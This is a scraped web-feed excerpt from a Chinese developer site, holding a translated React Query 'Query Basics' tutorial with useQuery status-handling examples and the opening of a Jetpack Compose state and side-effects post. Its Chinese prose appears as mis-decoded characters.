code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æŸ¥è¯¢åŸºç¡€ (Query Basics)</h2>
<p>æŸ¥è¯¢ï¼ˆQueryï¼‰æ˜¯å¯¹ç»‘å®šåˆ° <strong>å”¯ä¸€é”®ï¼ˆunique keyï¼‰</strong> çš„å¼‚æ­¥æ•°æ®æºçš„å£°æ˜æ€§ä¾èµ–ã€‚æŸ¥è¯¢å¯ä»¥ä¸ä»»ä½•åŸºäº Promise çš„æ–¹æ³•ï¼ˆåŒ…æ‹¬ GET å’Œ POST æ–¹æ³•ï¼‰ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä¾¿ä»æœåŠ¡å™¨è·å–æ•°æ®ã€‚å¦‚æœä½ çš„æ–¹æ³•ä¿®æ”¹äº†æœåŠ¡å™¨ä¸Šçš„æ•°æ®ï¼Œæˆ‘ä»¬å»ºè®®æ”¹ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3D.%2Fmutations.md" target="_blank" title="https://www.google.com/search?q=./mutations.md" ref="nofollow noopener noreferrer">å˜æ›´ï¼ˆMutationsï¼‰</a>ã€‚</p>
<p>è¦åœ¨ç»„ä»¶æˆ–è‡ªå®šä¹‰ Hook ä¸­è®¢é˜…æŸ¥è¯¢ï¼Œè¯·è°ƒç”¨ <code>useQuery</code> hookï¼Œå…¶ä¸­è‡³å°‘åŒ…å«ï¼š</p>
<ul>
<li>
<p>ä¸€ä¸ª <strong>æŸ¥è¯¢çš„å”¯ä¸€é”®</strong></p>
</li>
<li>
<p>ä¸€ä¸ªè¿”å› Promise çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°ï¼š</p>
<ul>
<li>è§£æï¼ˆResolveï¼‰æ•°æ®ï¼Œæˆ–è€…</li>
<li>æŠ›å‡ºï¼ˆThrowï¼‰é”™è¯¯</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">import</span> { useQuery } <span class="hljs-keyword">from</span> <span class="hljs-string">'@tanstack/react-query'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> info = <span class="hljs-title function_">useQuery</span>({ <span class="hljs-attr">queryKey</span>: [<span class="hljs-string">'todos'</span>], <span class="hljs-attr">queryFn</span>: fetchTodoList })
}
</code></pre>
<p>ä½ æä¾›çš„ <strong>å”¯ä¸€é”®</strong> åœ¨å†…éƒ¨ç”¨äºåœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­é‡æ–°è·å–ã€ç¼“å­˜å’Œå…±äº«ä½ çš„æŸ¥è¯¢ã€‚</p>
<p><code>useQuery</code> è¿”å›çš„æŸ¥è¯¢ç»“æœåŒ…å«äº†ä½ åœ¨æ¨¡æ¿åŒ–æˆ–ä»¥å…¶ä»–æ–¹å¼ä½¿ç”¨æ•°æ®æ—¶æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">useQuery</span>({ <span class="hljs-attr">queryKey</span>: [<span class="hljs-string">'todos'</span>], <span class="hljs-attr">queryFn</span>: fetchTodoList })
</code></pre>
<p><code>result</code> å¯¹è±¡åŒ…å«å‡ ä¸ªéå¸¸é‡è¦çš„çŠ¶æ€ï¼Œä½ éœ€è¦äº†è§£å®ƒä»¬æ‰èƒ½é«˜æ•ˆå·¥ä½œã€‚åœ¨ä»»ä½•ç»™å®šæ—¶åˆ»ï¼ŒæŸ¥è¯¢åªèƒ½å¤„äºä»¥ä¸‹çŠ¶æ€ä¹‹ä¸€ï¼š</p>
<ul>
<li><code>isPending</code> æˆ– <code>status === 'pending'</code> - æŸ¥è¯¢å°šæ— æ•°æ®</li>
<li><code>isError</code> æˆ– <code>status === 'error'</code> - æŸ¥è¯¢é‡åˆ°é”™è¯¯</li>
<li><code>isSuccess</code> æˆ– <code>status === 'success'</code> - æŸ¥è¯¢æˆåŠŸä¸”æ•°æ®å¯ç”¨</li>
</ul>
<p>é™¤äº†è¿™äº›ä¸»è¦çŠ¶æ€ä¹‹å¤–ï¼Œæ ¹æ®æŸ¥è¯¢çš„çŠ¶æ€ï¼Œè¿˜æœ‰æ›´å¤šä¿¡æ¯å¯ç”¨ï¼š</p>
<ul>
<li><code>error</code> - å¦‚æœæŸ¥è¯¢å¤„äº <code>isError</code> çŠ¶æ€ï¼Œå¯ä»¥é€šè¿‡ <code>error</code> å±æ€§è·å–é”™è¯¯ä¿¡æ¯ã€‚</li>
<li><code>data</code> - å¦‚æœæŸ¥è¯¢å¤„äº <code>isSuccess</code> çŠ¶æ€ï¼Œå¯ä»¥é€šè¿‡ <code>data</code> å±æ€§è·å–æ•°æ®ã€‚</li>
<li><code>isFetching</code> - åœ¨ä»»ä½•çŠ¶æ€ä¸‹ï¼Œå¦‚æœæŸ¥è¯¢åœ¨ä»»ä½•æ—¶å€™æ­£åœ¨è·å–æ•°æ®ï¼ˆåŒ…æ‹¬åå°é‡æ–°è·å–ï¼‰ï¼Œ<code>isFetching</code> å°†ä¸º <code>true</code>ã€‚</li>
</ul>
<p>å¯¹äº <strong>å¤§å¤šæ•°</strong> æŸ¥è¯¢ï¼Œé€šå¸¸åªéœ€æ£€æŸ¥ <code>isPending</code> çŠ¶æ€ï¼Œç„¶åæ˜¯ <code>isError</code> çŠ¶æ€ï¼Œæœ€åå‡è®¾æ•°æ®å¯ç”¨å¹¶æ¸²æŸ“æˆåŠŸçŠ¶æ€å³å¯ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Todos</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { isPending, isError, data, error } = <span class="hljs-title function_">useQuery</span>({
    <span class="hljs-attr">queryKey</span>: [<span class="hljs-string">'todos'</span>],
    <span class="hljs-attr">queryFn</span>: fetchTodoList,
  })

  <span class="hljs-keyword">if</span> (isPending) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  }

  <span class="hljs-keyword">if</span> (isError) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>é”™è¯¯: {error.message}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  }

  <span class="hljs-comment">// åˆ°è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‡è®¾ `isSuccess === true`</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
      {data.map((todo) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{todo.id}</span>&gt;</span>{todo.title}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  )
}
</code></pre>
<p>å¦‚æœä½ ä¸å–œæ¬¢ä½¿ç”¨å¸ƒå°”å€¼ï¼Œä½ ä¹Ÿå¯ä»¥éšæ—¶ä½¿ç”¨ <code>status</code> çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Todos</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { status, data, error } = <span class="hljs-title function_">useQuery</span>({
    <span class="hljs-attr">queryKey</span>: [<span class="hljs-string">'todos'</span>],
    <span class="hljs-attr">queryFn</span>: fetchTodoList,
  })

  <span class="hljs-keyword">if</span> (status === <span class="hljs-string">'pending'</span>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  }

  <span class="hljs-keyword">if</span> (status === <span class="hljs-string">'error'</span>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>é”™è¯¯: {error.message}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  }

  <span class="hljs-comment">// è™½ç„¶ status === 'success'ï¼Œä½† "else" é€»è¾‘ä¹Ÿè¡Œå¾—é€š</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
      {data.map((todo) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{todo.id}</span>&gt;</span>{todo.title}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  )
}
</code></pre>
<p>å¦‚æœä½ åœ¨è®¿é—® <code>data</code> ä¹‹å‰æ£€æŸ¥äº† <code>pending</code> å’Œ <code>error</code>ï¼ŒTypeScript ä¹Ÿä¼šæ­£ç¡®åœ°ç¼©å° <code>data</code> çš„ç±»å‹èŒƒå›´ã€‚</p>
<h3 data-id="heading-1">FetchStatus (è·å–çŠ¶æ€)</h3>
<p>é™¤äº† <code>status</code> å­—æ®µå¤–ï¼Œä½ è¿˜å°†è·å¾—ä¸€ä¸ªé¢å¤–çš„ <code>fetchStatus</code> å±æ€§ï¼Œå…¶é€‰é¡¹å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>fetchStatus === 'fetching'</code> - æŸ¥è¯¢å½“å‰æ­£åœ¨è·å–æ•°æ®ã€‚</li>
<li><code>fetchStatus === 'paused'</code> - æŸ¥è¯¢æƒ³è¦è·å–æ•°æ®ï¼Œä½†è¢«æš‚åœäº†ã€‚æ›´å¤šä¿¡æ¯è¯·é˜…è¯» <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3D.%2Fnetwork-mode.md" target="_blank" title="https://www.google.com/search?q=./network-mode.md" ref="nofollow noopener noreferrer">ç½‘ç»œæ¨¡å¼</a> æŒ‡å—ã€‚</li>
<li><code>fetchStatus === 'idle'</code> - æŸ¥è¯¢å½“å‰æ²¡æœ‰è¿›è¡Œä»»ä½•æ“ä½œã€‚</li>
</ul>
<h3 data-id="heading-2">ä¸ºä»€ä¹ˆæœ‰ä¸¤ç§ä¸åŒçš„çŠ¶æ€ï¼Ÿ</h3>
<p>åå°é‡æ–°è·å–ï¼ˆBackground refetchesï¼‰å’Œâ€œè¿‡æœŸæ—¶é‡æ–°éªŒè¯ï¼ˆstale-while-revalidateï¼‰â€é€»è¾‘ä½¿å¾— <code>status</code> å’Œ <code>fetchStatus</code> çš„æ‰€æœ‰ç»„åˆæˆä¸ºå¯èƒ½ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>ä¸€ä¸ªå¤„äº <code>success</code> çŠ¶æ€çš„æŸ¥è¯¢é€šå¸¸ <code>fetchStatus</code> ä¸º <code>idle</code>ï¼Œä½†å¦‚æœæ­£åœ¨è¿›è¡Œåå°é‡æ–°è·å–ï¼Œå®ƒä¹Ÿå¯èƒ½å¤„äº <code>fetching</code> çŠ¶æ€ã€‚</li>
<li>ä¸€ä¸ªåˆšæŒ‚è½½ä¸”æ²¡æœ‰æ•°æ®çš„æŸ¥è¯¢é€šå¸¸å¤„äº <code>pending</code> çŠ¶æ€å’Œ <code>fetching</code> çš„ <code>fetchStatus</code>ï¼Œä½†å¦‚æœæ²¡æœ‰ç½‘ç»œè¿æ¥ï¼Œå®ƒä¹Ÿå¯èƒ½æ˜¯ <code>paused</code>ã€‚</li>
</ul>
<p>æ‰€ä»¥è¯·è®°ä½ï¼ŒæŸ¥è¯¢å¯èƒ½å¤„äº <code>pending</code> çŠ¶æ€ï¼Œä½†å®é™…ä¸Šå¹¶æ²¡æœ‰åœ¨è·å–æ•°æ®ã€‚ä½œä¸ºä¸€ä¸ªç»éªŒæ³•åˆ™ï¼š</p>
<ul>
<li><code>status</code> æä¾›å…³äº <code>data</code> çš„ä¿¡æ¯ï¼šæˆ‘ä»¬è¦ä¹ˆæœ‰æ•°æ®ï¼Œè¦ä¹ˆæ²¡æœ‰ã€‚</li>
<li><code>fetchStatus</code> æä¾›å…³äº <code>queryFn</code> çš„ä¿¡æ¯ï¼šå®ƒæ˜¯å¦æ­£åœ¨è¿è¡Œï¼Ÿ</li>
</ul>
<h2 data-id="heading-3">å»¶ä¼¸é˜…è¯»</h2>
<p>å…³äºæ‰§è¡ŒçŠ¶æ€æ£€æŸ¥çš„å¦ä¸€ç§æ–¹æ³•ï¼Œè¯·æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Ftkdodo.eu%2Fblog%2Fstatus-checks-in-react-query" target="_blank" title="https://tkdodo.eu/blog/status-checks-in-react-query" ref="nofollow noopener noreferrer">TkDodo çš„è¿™ç¯‡æ–‡ç« </a>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Compose é«˜çº§çŠ¶æ€å’Œé™„å¸¦æ•ˆåº”]]></title>    <link>https://juejin.cn/post/7582231988146782259</link>    <guid>https://juejin.cn/post/7582231988146782259</guid>    <pubDate>2025-12-11T09:00:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582231988146782259" data-draft-id="7581648776302690313" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Compose é«˜çº§çŠ¶æ€å’Œé™„å¸¦æ•ˆåº”"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-11T09:00:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Best_Jerry"/> <meta itemprop="url" content="https://juejin.cn/user/1099167360106999"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Compose é«˜çº§çŠ¶æ€å’Œé™„å¸¦æ•ˆåº”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1099167360106999/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Best_Jerry
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T09:00:47.000Z" title="Thu Dec 11 2025 09:00:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»24åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fcodelabs%2Fjetpack-compose-advanced-state-side-effects%3Fhl%3Dzh-cn%26continue%3Dhttps%253A%252F%252Fdeveloper.android.com%252Fcourses%252Fpathways%252Fjetpack-compose-for-android-developers-3%253Fhl%253Dzh-cn%2523codelab-https%253A%252F%252Fdeveloper.android.com%252Fcodelabs%252Fjetpack-compose-advanced-state-side-effects%230" target="_blank" title="https://developer.android.com/codelabs/jetpack-compose-advanced-state-side-effects?hl=zh-cn&amp;continue=https%3A%2F%2Fdeveloper.android.com%2Fcourses%2Fpathways%2Fjetpack-compose-for-android-developers-3%3Fhl%3Dzh-cn%23codelab-https%3A%2F%2Fdeveloper.android.com%2Fcodelabs%2Fjetpack-compose-advanced-state-side-effects#0" ref="nofollow noopener noreferrer">Jetpack Compose ä¸­çš„é«˜çº§çŠ¶æ€å’Œé™„å¸¦æ•ˆåº”</a></p>
<p>äº†è§£ä¸ Jetpack Compose ä¸­çš„çŠ¶æ€å’Œé™„å¸¦æ•ˆåº” API ç›¸å…³çš„é«˜çº§æ¦‚å¿µã€‚äº†è§£å¦‚ä½•ä¸ºå¤æ‚çš„æœ‰çŠ¶æ€å¯ç»„åˆé¡¹åˆ›å»ºçŠ¶æ€å®¹å™¨ã€é€šè¿‡ Compose ä»£ç åˆ›å»ºåç¨‹å’Œè°ƒç”¨æŒ‚èµ·å‡½æ•°ï¼Œä»¥åŠé’ˆå¯¹ä¸åŒçš„ç”¨ä¾‹è§¦å‘é™„å¸¦æ•ˆåº”ã€‚</p>
<h2 data-id="heading-0">1. ç®€ä»‹</h2>
<p>åœ¨æ­¤ Codelab ä¸­ï¼Œæ‚¨å°†å­¦ä¹ ä¸Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fjetpack%2Fcompose%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/jetpack/compose?hl=zh-cn" ref="nofollow noopener noreferrer">Jetpack Compose</a>Â ä¸­çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fjetpack%2Fcompose%2Fstate%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/jetpack/compose/state?hl=zh-cn" ref="nofollow noopener noreferrer">çŠ¶æ€</a>å’Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fjetpack%2Fcompose%2Fside-effects%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/jetpack/compose/side-effects?hl=zh-cn" ref="nofollow noopener noreferrer">é™„å¸¦æ•ˆåº”</a>Â API ç›¸å…³çš„é«˜çº§æ¦‚å¿µã€‚æ‚¨å°†äº†è§£å¦‚ä½•ä¸ºé€»è¾‘å¹¶ä¸ç®€å•çš„æœ‰çŠ¶æ€å¯ç»„åˆé¡¹åˆ›å»ºçŠ¶æ€å®¹å™¨ï¼Œå¦‚ä½•ä» Compose ä»£ç åˆ›å»ºåç¨‹å¹¶è°ƒç”¨æŒ‚èµ·å‡½æ•°ï¼Œä»¥åŠå¦‚ä½•è§¦å‘é™„å¸¦æ•ˆåº”ä»¥å®Œæˆä¸åŒçš„ç”¨ä¾‹ã€‚</p>
<h3 data-id="heading-1">å­¦ä¹ å†…å®¹</h3>
<ul>
<li>å¦‚ä½•ä» Compose ä»£ç è§‚å¯Ÿæ•°æ®æµä»¥æ›´æ–°ç•Œé¢ã€‚</li>
<li>å¦‚ä½•ä¸ºæœ‰çŠ¶æ€å¯ç»„åˆé¡¹åˆ›å»ºçŠ¶æ€å®¹å™¨ã€‚</li>
<li>é™„å¸¦æ•ˆåº” APIï¼Œå¦‚Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23LaunchedEffect(kotlin.Any%2Ckotlin.coroutines.SuspendFunction1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#LaunchedEffect(kotlin.Any,kotlin.coroutines.SuspendFunction1)" ref="nofollow noopener noreferrer"><code>LaunchedEffect</code></a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23rememberUpdatedState(kotlin.Any)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#rememberUpdatedState(kotlin.Any)" ref="nofollow noopener noreferrer"><code>rememberUpdatedState</code></a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23DisposableEffect(kotlin.Any%2Ckotlin.Function1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#DisposableEffect(kotlin.Any,kotlin.Function1)" ref="nofollow noopener noreferrer"><code>DisposableEffect</code></a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23produceState(kotlin.Any%2Ckotlin.coroutines.SuspendFunction1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#produceState(kotlin.Any,kotlin.coroutines.SuspendFunction1)" ref="nofollow noopener noreferrer"><code>produceState</code></a>Â å’ŒÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23derivedStateOf(kotlin.Function0)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#derivedStateOf(kotlin.Function0)" ref="nofollow noopener noreferrer"><code>derivedStateOf</code></a>ã€‚</li>
